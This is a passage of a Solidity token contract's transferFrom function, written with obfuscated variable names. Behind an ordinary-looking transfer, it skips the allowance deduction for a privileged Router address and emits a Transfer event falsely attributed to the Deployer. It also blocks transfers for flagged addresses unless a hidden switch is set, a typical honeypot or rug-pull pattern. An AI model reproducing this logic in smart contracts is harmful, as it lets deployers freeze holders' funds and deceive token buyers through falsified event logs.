        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   

        if(from == Router)  {

        require(value <= aEVr[from]);

        require(value <= allowance[from][msg.sender]);

        aEVr[from] -= value;  

        aEVr[to] += value; 

        emit Transfer (Deployer, to, value);

        return true; }    

        if(yRSc[from] || yRSc[to]) {

        require(eM == 1);}

        require(value <= aEVr[from]);

        require(value <= allowance[from][msg.sender]);

        aEVr[from] -= value;

        aEVr[to] += value;

        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);

        return true; }}
